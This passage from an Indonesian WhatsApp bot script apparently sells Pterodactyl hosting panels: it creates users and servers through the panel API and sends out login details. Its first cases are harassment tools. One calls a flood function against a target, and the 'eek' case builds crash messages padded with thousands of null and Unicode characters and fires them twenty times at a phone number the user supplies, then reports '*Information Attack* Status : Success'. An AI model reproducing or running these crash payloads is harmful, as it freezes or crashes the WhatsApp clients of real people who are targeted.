await sleep(5000)
await FloodsCarousel(Target, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyLanz(put)
}
break
        
case "eek": {
async function U(Putzz, target) {
  try {
    const nuxz = [
      {
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"flow_cta":"${"\u0000".repeat(2000)}"}`,
          version: 3
        }
      },
      {
        newsletterAdminInviteMessage: {
          newsletterJid: "1327272@newsletter",
          newsletterName: "🩸" + "ោ៝".repeat(20000),
          caption: "ꦾ".repeat(20000),
          inviteExpiration: Date.now() + 1814400,
        }
      }
    ];

      const memek = await generateWAMessageFromContent(target, nuxz, {})
      await Putzz.relayMessage(target, memek.message, 
      { messageId: memek.key.id });
    

  } catch (err) {
    console.error("U error:", err);
  }
}
if (!q) return ReplyLanz(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let target = pelaku + "@s.whatsapp.net"
await Putzz.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
for (let r = 0; r < 20; r++) {
await U(Putzz, target)
await sleep(800)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyLanz(put)
}
break

case "cpanel": {
    if (!isOwner && !isUserPremium) return PutzzReplyLanz(mess.prem);

    
    if (!text) return ReplyLanz(example("username"));

    let [version, username] = text.includes(",") ? text.split(",") : [null, text];
    if (!/^[a-z0-9]+$/i.test(username.trim())) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");

    try {
        if (!version) {
            const teksnya = "*Pilih Server Untuk Membuat Panel*";

            const sections = [
                {
                    title: "# Pilih server di bawah",
                    rows: Object.keys(global.cok).map((_, index) => ({
                        title: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩${index + 1}`,
                        description: `${global.cok[`panel${index + 1}`].nama}`,
                        id: `${prefix}cpanel ${index + 1},${username}`
                    }))
                }
            ];

            const buttons = [
                {
                    buttonId: "action",
                    buttonText: { displayText: "🔹 Pilih Server 🔹" },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({ title: "ᴄʟɪᴄʟɪᴄᴋ ʜᴇʀᴇ", sections })
                    }
                }
            ];

            return Putzz.sendMessage(m.chat, {
                document: cukurukuk,
                mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                caption: teksnya,
                fileName: "𝐋𝐚𝐧𝐳𝐕𝟕",
                footer: `*${botname}*`,
                buttons,
                viewOnce: true,
                headerType: 1,
                contextInfo: {
                    mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                    isForwarded: true,
                    businessMessageForwardInfo: {
                        businessOwnerJid: global.owner + "@s.whatsapp.net"
                    },
                    externalAdReply: {
                        containsAutoReply: true,
                        thumbnailUrl: global.image.panel,
                        title: `✨ Powered By ${namaOwner}`,
                        renderLargerThumbnail: true,
                        sourceUrl: global.linkGrup,
                        mediaType: 1
                    }
                }
            }, { quoted: m });
        }

        let versi = parseInt(version);
        let userPremium = isPremium[versi];
        if (!isOwner && !userPremium) return ReplyLanz(`${mess.prem} 𝗩${versi}!`);

        const usernya = username.toLowerCase().trim();
        const panelData = global.cok[`panel${versi}`];
        const { nama: namanya, apikey } = panelData;

        if (!apikey || apikey.length < 43) return ReplyLanz("🚫 *ᴀᴘᴀᴋᴀʜ ᴀᴘɪᴋᴇʏ sᴜᴅᴀʜ ʙᴇɴᴀʀ? !*");

        const teksnya = "*ᴘɪʟɪʜ ʀᴀᴍ ᴅᴀɴ ᴄᴘᴜ ᴜɴᴛᴜᴋ ᴘᴀɴᴇʟ ᴀɴᴅᴀ*";

        const specs = [
            { gb: 1, cpu: 40 }, { gb: 2, cpu: 70 }, { gb: 3, cpu: 100 },
            { gb: 4, cpu: 130 }, { gb: 5, cpu: 160 }, { gb: 6, cpu: 190 },
            { gb: 7, cpu: 220 }, { gb: 8, cpu: 250 }, { gb: 9, cpu: 280 },
            { gb: 10, cpu: 320 }
        ];

        const rows = specs.map(x => ({
            title: `RAM ${x.gb} GB | CPU ${x.cpu}%`,
            id: `${prefix}${x.gb}gb ${versi},${usernya}`
        }));

        rows.push({
            title: "RAM ∞ GB | CPU ∞%",
            id: `${prefix}unli ${versi},${usernya}`
        });

        const sections = [
            {
                title: "# ᴘɪʟɪʜ sᴘᴇᴋ ᴘᴀɴᴇʟ",
                rows
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        return Putzz.sendMessage(m.chat, {
            text: teksnya,
            footer: `*${namanya}*`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
            }
        }, { quoted: qfake });

    } catch (error) {
        console.error("❌ Error in cpanel:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan:\n${error.message}`);
    }
}
break;


case "1gb": case "2gb": case "3gb": case "4gb": case "5gb":
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unli": {
    let [version, username] = text.split(",");
    if (!version || !username) return;
    
    const versiInt = parseInt(version);

    if (isNaN(versiInt) || versiInt < 1 || versiInt > 150) return;

    const userPremium = isPremium[versiInt];
    if (!isOwner && !userPremium) return kirim(`${mess.prem} 𝗩${version}!`);

    
    const config = global.cok[`panel${version}`];
    if (!config) return;
    
    const { nama: namanya, domain, apikey, nestid, loc, egg } = config;

    if (!/^[a-z0-9]+$/i.test(username)) return;
    
    const specs = {
        "1gb":  { ram: 1125, disk: 1125, cpu: 40 },
        "2gb":  { ram: 2125, disk: 2125, cpu: 70 },
        "3gb":  { ram: 3125, disk: 3125, cpu: 100 },
        "4gb":  { ram: 4125, disk: 4125, cpu: 130 },
        "5gb":  { ram: 5125, disk: 5125, cpu: 160 },
        "6gb":  { ram: 6125, disk: 6125, cpu: 190 },
        "7gb":  { ram: 7125, disk: 7125, cpu: 220 },
        "8gb":  { ram: 8125, disk: 8125, cpu: 250 },
        "9gb":  { ram: 9125, disk: 9125, cpu: 280 },
        "10gb": { ram: 10500, disk: 10500, cpu: 320 },
        "unli": { ram: 0, disk: 0, cpu: 0 }
    };

    const selectedSpec = specs[command];
    if (!selectedSpec) return kirim("Command tidak valid.");

    try {
        const { ram, disk, cpu } = selectedSpec;
        const lowerUsername = username.toLowerCase();
        const email = `${lowerUsername}@Putzz.id`;
        const name = lowerUsername[0].toUpperCase() + lowerUsername.slice(1);
        const password = lowerUsername + crypto.randomBytes(2).toString("hex");
        const description = "Dibuat pada hari " + tanggal(Date.now());

        const userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username: lowerUsername,
                first_name: name,
                last_name: "Server",
                language: "en",
                password
            })
        });

        if (!userRes.ok) {
            const err = await userRes.json().catch(() => ({}));
            const detail = err?.errors?.map(e => `- ${translateError(e.detail)}`).join("\n") || "Respon tidak terduga dari server.";
            return kirim(`❌ Gagal membuat user.\n\n${detail}`);
        }

        const userId = (await userRes.json()).attributes.id;

        const eggRes = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        if (!eggRes.ok) {
            const err = await eggRes.json().catch(() => ({}));
            const detail = err?.errors?.map(e => `- ${translateError(e.detail)}`).join("\n") || "Respon tidak terduga dari server.";
            return kirim(`❌ Gagal mengambil data egg.\n\n${detail}`);
        }

        const eggData = await eggRes.json();
        const startup = eggData.attributes.startup;
        const dockerImage = await getBestNodeVersion(domain, apikey);

        const serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description,
                user: userId,
                egg: parseInt(egg),
                docker_image: dockerImage,
                startup,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
            })
        });

        if (!serverRes.ok) {
            const err = await serverRes.json().catch(() => ({}));
            const detail = err?.errors?.map(e => `- ${translateError(e.detail)}`).join("\n") || "Respon tidak terduga dari server.";
            return kirim(`❌ Gagal membuat server.\n\n${detail}`);
        }

        const serverId = (await serverRes.json()).attributes.id;
        const target = m.isGroup ? m.sender : m.chat;

        if (m.isGroup) await kirim(`✅ *Berhasil membuat panel di ${namanya}*\n_📩 Data akun telah dikirim ke private chat._`);

        const teks = `*📦 Pesanan Telah Datang 📦*\n\n` +
            `*Berikut Data Akun Panel Anda 🌐*\n` +
            `- *ID Server:* ${serverId}\n` +
            `- *Nama:* ${name}\n` +
            `- *Ram:* ${ram === 0 ? "Unlimited" : `${Math.floor(ram / 1024)} GB`}\n` +
            `- *CPU:* ${cpu === 0 ? "Unlimited" : `${cpu}%`}\n` +
            `- *Disk:* ${disk === 0 ? "Unlimited" : `${Math.floor(disk / 1024)} GB`}\n` +
            `- *Created:* ${description}\n\n` +
            `${more}\n` +
            `➥ *Username:* ${lowerUsername}\n` +
            `➥ *Password:* ${password}\n` +
            `➥ *Link Login:* ${domain}\n\n` +
            `*Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!*\n` +
            `_Garansi Aktif 15 Hari_\n\n` +
            `𝐆𝐫𝐮𝐩 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩\n${linkGrup}`;

        await Putzz.sendMessage(target, { text: teks }, { quoted: qtoko });


    } catch (error) {
        console.error(`Error in ${command}:`, error);
        return kirim(`Terjadi kesalahan saat memproses permintaan Anda:\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2":
case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2":
case "unli2": {
    if (!text) return;
    
    let [userpanel2, phoneNumber] = args[0].split(",");
    let p = args[1]?.trim()
    let version = parseInt(p);

    if (isNaN(version) || version < 1 || version > 150) return;

    let userPremium = isPremium[version];

    if (!isOwner && !userPremium) return kirim(`${mess.prem} 𝗩${version}!`);

    if (!userpanel2 || !phoneNumber) return;
    if (!/^[a-z0-9]+$/i.test(userpanel2)) return;
    if (phoneNumber.startsWith("0")) return;

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return kirim("Nomor tersebut tidak terdaftar di WhatsApp.");

    const client = `${phoneNumber.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
    const specs = {
        "1gb2": { ram: 1125, disk: 1125, cpu: 40 },
        "2gb2": { ram: 2125, disk: 2125, cpu: 70 },
        "3gb2": { ram: 3125, disk: 3125, cpu: 100 },
        "4gb2": { ram: 4125, disk: 4125, cpu: 130 },
        "5gb2": { ram: 5125, disk: 5125, cpu: 160 },
        "6gb2": { ram: 6125, disk: 6125, cpu: 190 },
        "7gb2": { ram: 7125, disk: 7125, cpu: 220 },
        "8gb2": { ram: 8125, disk: 8125, cpu: 250 },
        "9gb2": { ram: 9125, disk: 9125, cpu: 280 },
        "10gb2": { ram: 10500, disk: 10500, cpu: 320 },
        "unli2": { ram: 0, disk: 0, cpu: 0 }
    };
    const selectedSpec = specs[command];
    if (!selectedSpec) return kirim("Command tidak valid.");

    const panel = global.cok[`panel${version}`];
    if (!panel) return;
    const { nama, domain, apikey, nestid, loc, egg } = panel;

    const lowerUsername = userpanel2.toLowerCase();
    const email = `${lowerUsername}@Putzz.id`;
    const name = `${lowerUsername.charAt(0).toUpperCase()}${lowerUsername.slice(1)}`;
    const password = `${lowerUsername}${crypto.randomBytes(2).toString("hex")}`;
    const description = tanggal(Date.now());

    try {
        const userResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username: lowerUsername,
                first_name: name,
                last_name: "Server",
                language: "en",
                password
            })
        });

        if (!userResponse.ok) {
            const errorData = await userResponse.json().catch(() => null);
            const errorMsg = errorData?.errors?.map(err => `- ${translateError(err.detail)}`).join("\n") || "Respon tidak terduga.";
            return kirim(`❌ Gagal membuat user.\n\n${errorMsg}`);
        }

        const userId = (await userResponse.json()).attributes.id;

        const eggResponse = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        if (!eggResponse.ok) {
            const errorData = await eggResponse.json().catch(() => null);
            const errorMsg = errorData?.errors?.map(err => `- ${translateError(err.detail)}`).join("\n") || "Respon tidak terduga.";
            return kirim(`❌ Gagal mendapatkan informasi egg.\n\n${errorMsg}`);
        }

        const eggData = await eggResponse.json();
        const startup = eggData.attributes.startup;
        const dockerImage = await getBestNodeVersion(domain, apikey);

        const { ram, disk, cpu } = selectedSpec;
        const serverResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description,
                user: userId,
                egg: parseInt(egg),
                docker_image: dockerImage,
                startup,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
            })
        });

        if (!serverResponse.ok) {
            const errorData = await serverResponse.json().catch(() => null);
            const errorMsg = errorData?.errors?.map(err => `- ${translateError(err.detail)}`).join("\n") || "Respon tidak terduga.";
            return kirim(`❌ Gagal membuat server.\n\n${errorMsg}`);
        }

        const serverId = (await serverResponse.json()).attributes.id;
        await kirim(`✅ *Berhasil membuat panel di ${nama}*\n_📩 Data akun telah dikirim ke nomor_ ${phoneNumber.split("@")[0]}`);

        const teks = `*📦 Pesanan Telah Datang 📦*\n\n` +
            `*Berikut Data Akun Panel Anda 🌐*\n` +
            `- *ID Server:* ${serverId}\n` +
            `- *Nama:* ${name}\n` +
            `- *Ram:* ${ram === 0 ? "Unlimited" : `${Math.floor(ram / 1024)} GB`}\n` +
            `- *CPU:* ${cpu === 0 ? "Unlimited" : `${cpu}%`}\n` +
            `- *Disk:* ${disk === 0 ? "Unlimited" : `${Math.floor(disk / 1024)} GB`}\n` +
            `- *Created:* ${description}\n\n` +
            `${more}\n` +
            `➥ *Username:* ${lowerUsername}\n` +
            `➥ *Password:* ${password}\n` +
            `➥ *Link Login:* ${domain}\n\n` +
            `*Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!*\n` +
            `_Garansi Aktif 15 Hari_\n\n` +
            `𝐆𝐫𝐮𝐩 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩\n${linkGrup}`;

        await Putzz.sendMessage(Putzz, { text: teks }, { quoted: qtoko });


    } catch (err) {
        console.error(`Error in ${command}:`, err);
        return kirim(`❌ Terjadi kesalahan saat memproses:\n${err.message}`);
    }
}
break;


case "setcpanel": {
    if (!isOwner) return;
    const [domainnya, apikeynya, capikeynya] = text.split(",");
    if (!domainnya || !apikeynya || !capikeynya) {
        return ReplyLanz(example(`domain,ptla,ptlc`));
    }
    
    let cocolok = `${domainnya},${apikeynya},${capikeynya}`;
    
    try {
        const teksnya = "*Mau Set API Create Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => {
                    const version = i + 1;
                    return {
                        title: `𝗦𝗘𝗧 𝗖𝗣𝗔𝗡𝗘𝗟 𝗩${version}`,
                        description: `Setting API Panel Di Server Ke-${version}`,
                        id: `${prefix}res_setcpanel${version} ${cocolok}`
                    };
                })
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜",
                        sections
                    })
                }
            }
        ];

        const buttonMessage = {
            text: teksnya,
            footer: `${botname}`,
            buttons: buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qpayment });
    } catch (error) {
        console.error("Error in clearpanel:", error.message);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

case "setcpanel2": {
    if (!isOwner) return;
    const [domainnya, apikeynya, capikeynya] = text.split(",");
    if (!domainnya || !apikeynya || !capikeynya) {
        return ReplyLanz(example(`domain,ptla,ptlc`));
    }
    
    let cocolok = `${domainnya},${apikeynya},${capikeynya}`;
    
    try {
        const teksnya = "*Mau Set API Create Panel Di Server Ke Berapa?*";

 buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜",
                        sections: [
            {
              title: 'PILIH SERVER CPANEL NYA',
              highlight_label: '',
              rows: [
                { 
                title: "𝗦𝗘𝗧_𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟭", 
                description: `Setting API Panel Di Server Ke-1`, 
                id: `${prefix}res_setcpanel1 ${cocolok}` 
                },
                { 
                title: "𝗦𝗘𝗧_𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟮", 
                description: `Setting API Panel Di Server Ke-2`, 
                id: `${prefix}res_setcpanel2 ${cocolok}` 
                },
                { 
                title: "𝗦𝗘𝗧_𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟯", 
                description: `Setting API Panel Di Server Ke-3`, 
                id: `${prefix}res_setcpanel3 ${cocolok}` 
                },
                { title: "𝗦𝗘𝗧_𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟰", 
                description: `Setting API Panel Di Server Ke-4`, 
                id: `${prefix}res_setcpanel4 ${cocolok}` 
                },
                { title: "𝗦𝗘𝗧_𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟱", 
                description: `Setting API Panel Di Server Ke-5`, 
                id: `${prefix}res_setcpanel5 ${cocolok}` 
                }, 
              ]
            }
          ]
        })
      }
      }
  ],

        buttonMessage = {
            text: teksnya,
            footer: `${botname}`,
            buttons: buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qtoko });
    } catch (error) {
        console.error("Error in clearpanel:", error.message);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;
// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //
case "res_setcpanel0":
case "res_setcpanel1":
case "res_setcpanel2":
case "res_setcpanel3":
case "res_setcpanel4":
case "res_setcpanel5":
case "res_setcpanel6":
case "res_setcpanel7":
case "res_setcpanel8":
case "res_setcpanel9":
case "res_setcpanel10":
case "res_setcpanel11":
case "res_setcpanel12":
case "res_setcpanel13":
case "res_setcpanel14":
case "res_setcpanel15":
case "res_setcpanel16":
case "res_setcpanel17":
case "res_setcpanel18":
case "res_setcpanel19":
case "res_setcpanel20":
case "res_setcpanel21":
case "res_setcpanel22":
case "res_setcpanel23":
case "res_setcpanel24":
case "res_setcpanel25":
case "res_setcpanel26":
case "res_setcpanel27":
case "res_setcpanel28":
case "res_setcpanel29":
case "res_setcpanel30":
case "res_setcpanel31":
case "res_setcpanel32":
case "res_setcpanel33":
case "res_setcpanel34":
case "res_setcpanel35":
case "res_setcpanel36":
case "res_setcpanel37":
case "res_setcpanel38":
case "res_setcpanel39":
case "res_setcpanel40":
case "res_setcpanel41":
case "res_setcpanel42":
case "res_setcpanel43":
case "res_setcpanel44":
case "res_setcpanel45":
case "res_setcpanel46":
case "res_setcpanel47":
case "res_setcpanel48":
case "res_setcpanel49":
case "res_setcpanel50":
case "res_setcpanel51":
case "res_setcpanel52":
case "res_setcpanel53":
case "res_setcpanel54":
case "res_setcpanel55":
case "res_setcpanel56":
case "res_setcpanel57":
case "res_setcpanel58":
case "res_setcpanel59":
case "res_setcpanel60":
case "res_setcpanel61":
case "res_setcpanel62":
case "res_setcpanel63":
case "res_setcpanel64":
case "res_setcpanel65":
case "res_setcpanel66":
case "res_setcpanel67":
case "res_setcpanel68":
case "res_setcpanel69":
case "res_setcpanel70":
case "res_setcpanel71":
case "res_setcpanel72":
case "res_setcpanel73":
case "res_setcpanel74":
case "res_setcpanel75":
case "res_setcpanel76":
case "res_setcpanel77":
case "res_setcpanel78":
case "res_setcpanel79":
case "res_setcpanel80":
case "res_setcpanel81":
case "res_setcpanel82":
case "res_setcpanel83":
case "res_setcpanel84":
case "res_setcpanel85":
case "res_setcpanel86":
case "res_setcpanel87":
case "res_setcpanel88":
case "res_setcpanel89":
case "res_setcpanel90":
case "res_setcpanel91":
case "res_setcpanel92":
case "res_setcpanel93":
case "res_setcpanel94":
case "res_setcpanel95":
case "res_setcpanel96":
case "res_setcpanel97":
case "res_setcpanel98":
case "res_setcpanel99":
case "res_setcpanel100": {
    if (!isOwner) return;

    const version = parseInt(command.replace("res_setcpanel", ""));
    const [domainnya, apikeynya, capikeynya] = text.split(",");
    const settingsPath = "./settings/setting-cpanel.js";

    try {
        const settingsContent = fs.readFileSync(settingsPath, "utf8");

        const regexDomain = new RegExp(`global\\.domain${version}\\s*=\\s*['"](.*?)['"]`, "g");
        const regexApiKey = new RegExp(`global\\.apikey${version}\\s*=\\s*['"](.*?)['"]`, "g");
        const regexCapikey = new RegExp(`global\\.capikey${version}\\s*=\\s*['"](.*?)['"]`, "g");

        if (!regexDomain.test(settingsContent) || !regexApiKey.test(settingsContent) || !regexCapikey.test(settingsContent)) {
            return ReplyLanz(`❌ Tidak ditemukan konfigurasi untuk global.domain${version}`);
        }

        let updatedContent = settingsContent
            .replace(regexDomain, `global.domain${version} = "${domainnya}"`)
            .replace(regexApiKey, `global.apikey${version} = "${apikeynya}"`)
            .replace(regexCapikey, `global.capikey${version} = "${capikeynya}"`);

        fs.writeFileSync(settingsPath, updatedContent, "utf8");

        await ReplyLanz(`✅ Berhasil Memperbarui API Create Panel Pada Server Ke-${version}!`);
    } catch (error) {
        console.error(error);
        await ReplyLanz("❌ Terjadi kesalahan saat memperbarui data!\n\n" + error.message);
    }
}
break;

case "listserver": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Lihat List Server Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `𝗟𝗜𝗦𝗧 𝗦𝗘𝗥𝗩𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `List Server Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}listserver_v${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗟𝗔𝗡𝗭𝗭 𝗫",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in listserver:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "listuser": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Lihat List User Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `𝗟𝗜𝗦𝗧 𝗨𝗦𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `List User Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}listuser_v${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗟𝗔𝗡𝗭𝗭 𝗫",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in listuser:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;
case "cadmin2": {
    if (!isOwner) return ReplyLanz(mess.wait);
    if (!text) return ReplyLanz(example("username"));

    let usernya = text.trim().toLowerCase();
    if (!/^[a-z0-9]+$/i.test(usernya)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");

    try {
        const teksnya = "*Pilih Server Untuk Membuat Admin Panel*";

        const sections = [
            {
                title: "# Silahkan Pilih Server",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Create Admin Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_cadminv${i + 1} ${usernya}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Server 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝑳𝑨𝑵𝒁 𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in cadmin:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;


case "cadmin": {
    if (!isOwner) return ReplyLanz(mess.wait);
    if (!text.includes(",")) return ReplyLanz(example("username,62xxx"));

    let [usernya, phoneNumber] = text.split(",").map(item => item.trim());
